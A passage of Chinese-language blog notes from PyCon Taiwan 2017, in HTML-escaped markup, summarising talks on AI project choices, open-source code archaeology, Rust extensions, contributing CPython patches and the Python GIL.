前面 30 分鐘基本上沒有啥重點 XD。  &lt;/p&gt;
&lt;p&gt;後面 30 分鐘開始講開始接觸 AI 會面臨哪些 Choices  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Motivation vs Feasibility  &lt;ul&gt;
&lt;li&gt;Motivation  &lt;ul&gt;
&lt;li&gt;something publishable? (maybe just for academia)  &lt;/li&gt;
&lt;li&gt;something profitable?  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Feasibility  &lt;ul&gt;
&lt;li&gt;Modeling  &lt;/li&gt;
&lt;li&gt;Timeline  &lt;/li&gt;
&lt;li&gt;Budget  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Big AI problems comes from Big Data  &lt;ul&gt;
&lt;li&gt;generate from motivation  &lt;ul&gt;
&lt;li&gt;variety: dream more in big data age  &lt;/li&gt;
&lt;li&gt;velocity: evolving data, evolving problem  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;generate from feasibility  &lt;ul&gt;
&lt;li&gt;volume: computational bottleneck  &lt;/li&gt;
&lt;li&gt;veracity: modeling with non-textbook data  &lt;ul&gt;
&lt;li&gt;資料的 noise 會比教科書上多很多  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;tip  &lt;ul&gt;
&lt;li&gt;often needing "choose and learn" towards good problems  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Human vs Machine-er Route  &lt;ul&gt;
&lt;li&gt;Human  &lt;/li&gt;
&lt;li&gt;Machine  &lt;ul&gt;
&lt;li&gt;objective criterion  &lt;/li&gt;
&lt;li&gt;use computing power  &lt;/li&gt;
&lt;li&gt;continuous improvement  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;How to measure AI goal  &lt;ul&gt;
&lt;li&gt;"Computers are useless, they can only give you answers."  &lt;/li&gt;
&lt;li&gt;Spec for Program  &lt;ul&gt;
&lt;li&gt;tip: always start with reasonable, measurable &amp;amp; priortized goals for AI.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;What Data to (or not to) Use?  &lt;ul&gt;
&lt;li&gt;Bring Your Own Bottle  &lt;/li&gt;
&lt;li&gt;Design Your ...  &lt;/li&gt;
&lt;li&gt;Choice factors for Data  &lt;ul&gt;
&lt;li&gt;Utility  &lt;/li&gt;
&lt;li&gt;Necessity  &lt;/li&gt;
&lt;li&gt;Quality  &lt;/li&gt;
&lt;li&gt;Cost  &lt;/li&gt;
&lt;li&gt;tip: garbages (data) in, garbages (AI) out. Choose your data.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;More Data Construction  &lt;ul&gt;
&lt;li&gt;不用一開始就要 AI 做事情，最好先用自己的腦袋先做一些 Data Analysis，再讓 AI 幫你完成這些事  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;What Model to Start?  &lt;ul&gt;
&lt;li&gt;myth: 即便有大量的資料也不該從最複雜的模型開始  &lt;/li&gt;
&lt;li&gt;Linear (Simpler) Model First  &lt;ul&gt;
&lt;li&gt;Keep It Simple and Stupid  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;What Improvements to take  &lt;ul&gt;
&lt;li&gt;Overfitting  &lt;ul&gt;
&lt;li&gt;控制模型的複雜度、做些資料的清理與選擇，讓你的模型可以維持在能夠運作的程度  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Misfitting  &lt;ul&gt;
&lt;li&gt;要 AI 做的好，要確定它在學習的東西是跟你最後的目標有關係  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Over-reusing  &lt;ul&gt;
&lt;li&gt;"If you torture the data long enough, it will confess"  &lt;/li&gt;
&lt;li&gt;當你過度重複處理你的資料，到最後的結果可能是會被汙染的，所以要儘量避免掉這件事。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;How to Verify and Deploy?  &lt;ul&gt;
&lt;li&gt;Code Deployment Workflow  &lt;ul&gt;
&lt;li&gt;Development =&amp;gt; Staging =&amp;gt; Production  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;AI Deployment Workflow  &lt;ul&gt;
&lt;li&gt;Offline =&amp;gt; Online =&amp;gt; Production  &lt;ul&gt;
&lt;li&gt;Offline  &lt;ul&gt;
&lt;li&gt;在這個階段常常會跟 Online 的部份有 Misfitting 的問題，所以通常只是做正確的驗證  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Online  &lt;ul&gt;
&lt;li&gt;這時候的 criterion 會跟你的目標比較接近  &lt;/li&gt;
&lt;li&gt;要謹慎選擇跟誰比較，跟太爛的比會太過樂觀，跟太好的比可能會過度調整而產生 Overfitting。  &lt;/li&gt;
&lt;li&gt;Human trust 會比你原本的目標來的重要，因為一個能用的 AI 是需要取的人的信任的，就算你達到目標，如果結果跑出來讓人不滿意的話，一樣達不到效果。要讓人能夠接受這個結果，才能夠發揮這個 AI 的價值。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;跟你的選擇一起學習，時時刻刻要把限制考慮進去，這樣才能夠做出比較好的決策。  &lt;/li&gt;
&lt;li&gt;在訓練 AI 的時候，就像訓練神奇寶貝一樣，會遇到非常多的選擇，而這些選擇也都真的會影響到你訓練出來的 AI 的好壞  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Q&amp;amp;A  &lt;ul&gt;
&lt;li&gt;剛剛演講的內容涉及到 Data Engineer 和 Data Scientist 的部份，想請問這兩者的區別？  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;硬要區分的話，Data Scientist 比較偏向設計，而 Data Engineer 比較偏向實作與驗證。但我自己是傾向不去區分，因為最終會需要的能力是跨領域的，所以都要瞭解才是比較好的  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;剛剛提到訓練出來的 AI 要取得人的信任，但這個常常會牽涉到客戶的利益，這該怎麼處理？  &lt;ul&gt;
&lt;li&gt;要確認彼此的期待是合理的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Python 開源軟體考古 - 以 Viper 為例&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Speaker: &lt;a href="https://github.com/18z"&gt;陳坤裕 KunYu Chen&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;GitHub repo of this talk: &lt;a href="https://github.com/18z/viper-research"&gt;https://github.com/18z/viper-research&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Viper: &lt;a href="https://github.com/viper-framework/viper"&gt;https://github.com/viper-framework/viper&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Collaborative Note: &lt;a href="https://hackmd.io/s/H1yP4MQye#1050-1120-talk-python-開源軟體考古-以-viper-為例"&gt;https://hackmd.io/s/H1yP4MQye#1050-1120-talk-python-開源軟體考古-以-viper-為例&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;覺得這場講的東西挺不錯的，&lt;br /&gt;
都算是講者自己整理出來的心得，&lt;br /&gt;
介紹了一些可以使用的工具，&lt;br /&gt;
也講了他是怎麼去 trace 以及觀察了哪些東西，&lt;br /&gt;
不失為一個拿來 trace open source project 的方法，&lt;br /&gt;
可能可以幫助自己更容易對於 open source contirbute 做貢獻。  &lt;/p&gt;
&lt;p&gt;可以產生 dependency graph 的工具：&lt;a href="http://furius.ca/snakefood/"&gt;http://furius.ca/snakefood/&lt;/a&gt;  &lt;/p&gt;
&lt;h2&gt;TenslorFlow Wide &amp;amp; Deep Data Classification the Easy Way&lt;/h2&gt;
&lt;p&gt;Speaker: Yufeng Guo @yufengG&lt;br /&gt;
Slides: &lt;a href="https://www.slideshare.net/YufengGuo4/pycon-tw-tensorflow-wide-deep-data-classification-the-easy-way"&gt;https://www.slideshare.net/YufengGuo4/pycon-tw-tensorflow-wide-deep-data-classification-the-easy-way&lt;/a&gt;&lt;br /&gt;
Code: &lt;a href="https://github.com/amygdala/tensorflow-workshop/tree/master/workshop_sections/wide_n_deep"&gt;https://github.com/amygdala/tensorflow-workshop/tree/master/workshop_sections/wide_n_deep&lt;/a&gt;  &lt;/p&gt;
&lt;h2&gt;Keynote: The State of Python for Education&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Speaker: Carol Willing  &lt;/li&gt;
&lt;li&gt;Collaborative Note: &lt;a href="https://hackfoldr.org/pycontw2017/https%253A%252F%252Fhackmd.io%252Fs%252FHk-NVGXke"&gt;https://hackfoldr.org/pycontw2017/https%253A%252F%252Fhackmd.io%252Fs%252FHk-NVGXke&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;for Education =&amp;gt; X&lt;br /&gt;
for Learning =&amp;gt; O&lt;br /&gt;
&lt;a href="https://github.com/jakevdp/WhirlwindTourOfPython"&gt;https://github.com/jakevdp/WhirlwindTourOfPython&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Learning with Python  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/jupyter/notebook"&gt;JupyterNotebook&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/jupyterlab/jupyterlab"&gt;JupyterLab&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://pyvideo.org/"&gt;pyvideo&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Creating opportunities  &lt;/li&gt;
&lt;li&gt;Scaling Globally  &lt;/li&gt;
&lt;li&gt;Call to Action  &lt;ul&gt;
&lt;li&gt;Join PSF and Python in Education  &lt;/li&gt;
&lt;li&gt;Participate in a sprint  &lt;/li&gt;
&lt;li&gt;Give a talk or write a post  &lt;/li&gt;
&lt;li&gt;Offer a workshop  &lt;/li&gt;
&lt;li&gt;Contribute to a favorite project  &lt;ul&gt;
&lt;li&gt;Open an issue  &lt;/li&gt;
&lt;li&gt;Fix typo  &lt;/li&gt;
&lt;li&gt;Send pull request  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Share your creations  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Building Microservices in Python 個案分享&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Speaker: Jonas Cheng  &lt;/li&gt;
&lt;li&gt;Slides: &lt;a href="https://www.slideshare.net/jonascheng3/building-microservices-in-python-pycon2017"&gt;https://www.slideshare.net/jonascheng3/building-microservices-in-python-pycon2017&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Collaborative Note: &lt;a href="https://hackmd.io/OwQwDCBMYEaQtADgJwBYT1WSj7IIwDMh8ApgCYCskyklMyi5qQA=?both#1455-1540-talk-building-microservices-in-python-個案分享"&gt;https://hackmd.io/OwQwDCBMYEaQtADgJwBYT1WSj7IIwDMh8ApgCYCskyklMyi5qQA=?both#1455-1540-talk-building-microservices-in-python-個案分享&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Soocii 是趨勢科技為了弄手機群聊而獨立出來的子公司  &lt;/p&gt;
&lt;p&gt;跨服務間的溝通最好是一個 transaction 就結束，&lt;br /&gt;
如果要額外呼叫其他的服務的話，&lt;br /&gt;
最好採用 async 的方式，&lt;br /&gt;
避免因為時間太長而被 timeout、影響 UX。  &lt;/p&gt;
&lt;h2&gt;Python Module in Rust&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Speaker: 許邱翔 (dv)  &lt;/li&gt;
&lt;li&gt;Slides: &lt;a href="https://docs.google.com/presentation/d/1mTw-4buKDTqPNzJS03s2I0apBMal-SaeKk1dHDSE6fk/pub?start=false&amp;amp;loop=false&amp;amp;delayms=3000&amp;amp;slide=id.g22c75fc6c3_0_6"&gt;https://docs.google.com/presentation/d/1mTw-4buKDTqPNzJS03s2I0apBMal-SaeKk1dHDSE6fk/pub?start=false&amp;amp;loop=false&amp;amp;delayms=3000&amp;amp;slide=id.g22c75fc6c3_0_6&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Rust 的生態系  &lt;ul&gt;
&lt;li&gt;特性  &lt;ul&gt;
&lt;li&gt;Memory safety without GC  &lt;/li&gt;
&lt;li&gt;Compiled language  &lt;/li&gt;
&lt;li&gt;Strong, static type  &lt;/li&gt;
&lt;li&gt;效能與 C / C++ 接近  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Tools  &lt;ul&gt;
&lt;li&gt;Crates (Like PyPI in Python)  &lt;/li&gt;
&lt;li&gt;Cargo (Like pip + setuptools)  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://doc.crates.io/"&gt;http://doc.crates.io/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;rustup (like pyenv)  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.rustup.rs/"&gt;https://www.rustup.rs/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;RFCs (like PEP)  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/rust-lang/rfcs"&gt;https://github.com/rust-lang/rfcs&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;How can Python play with binary  &lt;ul&gt;
&lt;li&gt;ctypes  &lt;/li&gt;
&lt;li&gt;CFFI  &lt;ul&gt;
&lt;li&gt;PyPy 團隊的實作  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CPython Extension  &lt;ul&gt;
&lt;li&gt;CPython 官方實作  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;How can Python play with Python  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/dgrunwald/rust-cpython"&gt;https://github.com/dgrunwald/rust-cpython&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/PyO3/setuptools-rust"&gt;https://github.com/PyO3/setuptools-rust&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Day 2 (2017/06/10)&lt;/h1&gt;
&lt;h2&gt;Stochastic Prediction Model, Case of the Dengue outbreak at Tainan, 2015&lt;/h2&gt;
&lt;p&gt;使用 Jupyter Notebook 利用資料分析與視覺化的方式，&lt;br /&gt;
來分析 2015 年台南登革熱爆發的狀況，&lt;br /&gt;
並將這些處理完後的資料拿來建立模型，&lt;br /&gt;
用於之後的預測。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Submit your first CPython patch (and don't worry about C)&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Speaker: &lt;a href="https://louie.lu"&gt;Louie Lu&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Slides: &lt;a href="https://goo.gl/4oC2Dg"&gt;https://goo.gl/4oC2Dg&lt;/a&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Intro  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Status of CPython Branches  &lt;/li&gt;
&lt;li&gt;History of CPython workflow  &lt;ul&gt;
&lt;li&gt;~2006: SourceForge (repo &amp;amp; issue tracker)  &lt;/li&gt;
&lt;li&gt;2006 ~ 2011: svn.python.org &amp;amp; bugs.python.org  &lt;/li&gt;
&lt;li&gt;2011 ~ 2016: hg.python.org  &lt;/li&gt;
&lt;li&gt;July 2014: PEP-474 by Nick Coghlan (propose moving to Kallithea)  &lt;/li&gt;
&lt;li&gt;Nov 2014: PEP-481  &lt;/li&gt;
&lt;li&gt;Sep 2015: PEP-507  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Basic  &lt;ul&gt;
&lt;li&gt;GitHub  &lt;/li&gt;
&lt;li&gt;Git  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;git remote -v&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CPython Coding Style  &lt;ul&gt;
&lt;li&gt;PEP7  &lt;/li&gt;
&lt;li&gt;PEP8 - CPython C Coding Style  &lt;ul&gt;
&lt;li&gt;比較特殊一點  &lt;/li&gt;
&lt;li&gt;4 spaces, 79 chars per line  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Sphinx document style  &lt;ul&gt;
&lt;li&gt;reStructuredText  &lt;ul&gt;
&lt;li&gt;Use 3 spaces, no tabs  &lt;/li&gt;
&lt;li&gt;Hyperlinks  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;Link text &amp;lt;http://example.com/&amp;gt;&lt;/code&gt;_  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Blocks  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;.. note::&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Layout  &lt;ul&gt;
&lt;li&gt;module, stdlib  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;Lib/&amp;lt;module&amp;gt;.py&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;extension-only module  &lt;/li&gt;
&lt;li&gt;builtin types  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;Objects/&amp;lt;builtin&amp;gt;object.c&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;builtin functions  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;Python/bltinmodule.c&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Exception!  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;int&lt;/code&gt; is at &lt;code&gt;Objects/longobject.c&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Contribute  &lt;ul&gt;
&lt;li&gt;How  &lt;ul&gt;
&lt;li&gt;Read, communicate, think  &lt;ul&gt;
&lt;li&gt;devguide  &lt;/li&gt;
&lt;li&gt;mailing lists  &lt;ul&gt;
&lt;li&gt;Python-dev  &lt;/li&gt;
&lt;li&gt;Python-ideas  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://bugs.python.org"&gt;bpo&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;IRC  &lt;ul&gt;
&lt;li&gt;freenode #python-dev  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;lwn.net  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://mail.python.org/pipermail/python-dev/2017-June"&gt;https://mail.python.org/pipermail/python-dev/2017-June&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Where  &lt;ul&gt;
&lt;li&gt;to find a bug?  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://bugs.python.org"&gt;http://bugs.python.org&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;source code  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;XXX&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;TODO&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;mailing list  &lt;/li&gt;
&lt;li&gt;stackoverflow  &lt;/li&gt;
&lt;li&gt;bpo-mergerate:  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://bpo-mergerate.louie.lu"&gt;https://bpo-mergerate.louie.lu&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;what can I do?  &lt;ul&gt;
&lt;li&gt;Writing documentation  &lt;/li&gt;
&lt;li&gt;Helping test patches  &lt;ul&gt;
&lt;li&gt;因為量很多通常核心貢獻者可能要幾個月後才有空測試，所以可以幫忙測試，然後給意見  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Review PR from others  &lt;/li&gt;
&lt;li&gt;Increase test coverage  &lt;/li&gt;
&lt;li&gt;Add comment to exists code  &lt;ul&gt;
&lt;li&gt;可以幫忙把程式碼加上註解，讓其他人比較容易瞭解  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Misc.  &lt;ul&gt;
&lt;li&gt;IDLE  &lt;/li&gt;
&lt;li&gt;devguide issues  &lt;ul&gt;
&lt;li&gt;有很多前人回報的問題，或者自己看到有問題也可以嘗試修改並 submit PR  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;easy issues  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://bugs.python.org/issue?status=1&amp;amp;@sort=-activity&amp;amp;@columns=id,activity,title,creator,status&amp;amp;@dispname=Easy%20issues&amp;amp;@startwith=0&amp;amp;@group=priority&amp;amp;keywords=6&amp;amp;@action=search&amp;amp;@filter=&amp;amp;@pagesize=50"&gt;http://bugs.python.org/issue?status=1&amp;amp;@sort=-activity&amp;amp;@columns=id,activity,title,creator,status&amp;amp;@dispname=Easy%20issues&amp;amp;@startwith=0&amp;amp;@group=priority&amp;amp;keywords=6&amp;amp;@action=search&amp;amp;@filter=&amp;amp;@pagesize=50&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Live contribution  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;from ctypes import *&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;Bug 被人搶先修掉了，只好修文件 XD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;講者表示有興趣的人可以參加第三天的 Unconference，會再更詳細的教學怎麼 contribute code 到 CPython  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;Global Interpreter Lock: Episode III - cat &amp;lt; /dev/zero &amp;gt; GIL;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Slide: https://www.slideshare.net/penvirus/global-interpreter-lock-episode-iii-cat-lt-devzero-gil  &lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Speaker: Tzung-Bi Shih  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;前情提要  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;一部曲：&lt;a href="https://www.slideshare.net/penvirus/global-interpreter-lock-episode-i-break-the-seal"&gt;https://www.slideshare.net/penvirus/global-interpreter-lock-episode-i-break-the-seal&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;想瞭解 GIL 的人可以去看這個講者相關的 talk  &lt;ul&gt;
&lt;li&gt;https://www.youtube.com/watch?v=MCs5OvhV9S4  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Introduction  &lt;ul&gt;
&lt;li&gt;GIL prevents us (innocently) from utilizing full power of multiprocessors  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我比較常舉的例子是紅綠燈，一定要綠燈才可以走。如果今天有人不管號誌直接硬走，就有可能發生碰撞，GIL 就像是這樣的一個例子，但討厭的是他是 Global 的，所以很煩人。例如今天這個會場，我現在拿著麥克風在講話，現在後面的朋友想跟他旁邊的人講話，他得大費周章得跑來前面，拿我的麥克風才能講話，這樣大家不會覺得很沒效率嗎？  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;NOTE: &lt;a href="https://blog.louie.lu/2017/05/19/深入-gil-如何寫出快速且-thread-safe-的-python-grok-the-gil-how-to-write-fast-and-thread-safe-python/"&gt;深入 GIL: 如何寫出快速且 thread-safe 的 Python – Grok the GIL: How to write fast and thread-safe Python&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;一句話說清 GIL: 「當有一個執行緒在執行 Python，其他 N 個執行緒都在睡覺或是等待 I/O」  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Motivation  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;大家是不是覺得我到底是多討厭 GIL 導致我要花三集來婊它？並不是的，是我在前公司和同事遇到的問題。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;High performance data processing platform  &lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;大家可能會認為只有寫 Python 的人才要懂 GIL，但其實 Big Lock 是一個 fundamental 的問題。系統發展在初期的時候常常會使用這樣的 lock。所以研究 GIL 並不是只有 Python 特定而已，其實在研究作業系統的時候都會遇到類似的問題，因為最後大多會把這個大 lock 拆分成不同的小 lock  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Example  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/penvirus/gil3/blob/master/1a.c"&gt;1a.c&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Get crashed if we don;t acquire the GIL before using the Python runtime.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/penvirus/gil3/blob/master/1b.c"&gt;1b.c&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Our multithreading program has been serialized into one "effective" thread  &lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;在 Python 的 multithreading 基本上都一定要處理 GIL 的問題，不然只會是「你以為自己有用到但實際上並沒有」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/penvirus/gil3/blob/master/1c.c"&gt;1c.c&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;warning: the example won't compile successfully.  &lt;/li&gt;
&lt;li&gt;嘗試修改，但兩個多小時之後沒成功就放棄了，改用其他方法  &lt;/li&gt;
&lt;li&gt;Dynamic linker 可能有幫助，朝著讓兩個 task 使用不同的 Python interpreter 的方向去解決  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/penvirus/gil3/blob/master/2a.c"&gt;2a.c&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/penvirus/gil3/blob/master/2b.c"&gt;2b.c&lt;/a&gt;, &lt;a href="https://github.com/penvirus/gil3/blob/master/2c.c"&gt;2c.c&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;成功了，但結束後得把 .so 檔刪掉。  &lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;這方法我給 87 分，因為太北七了，找到了 dlmopen 的文件，三天三夜跪在電腦前不能自我，醒來的時候已經是第四天早上  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/penvirus/gil3/blob/master/3a.c"&gt;3a.c&lt;/a&gt;, &lt;a href="https://github.com/penvirus/gil3/blob/master/3b.c"&gt;3b.c&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;後續使用 dlmopen 把 global 變數拆成兩份，確實是可以做到。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/penvirus/gil3/blob/master/4a.c"&gt;4a.c&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;但把 dlmopen 和 Python 放在一起就是會出事，像是這個例子。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;More Complicated Example  &lt;ul&gt;
&lt;li&gt;6b.c  &lt;ul&gt;
&lt;li&gt;configuration task  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
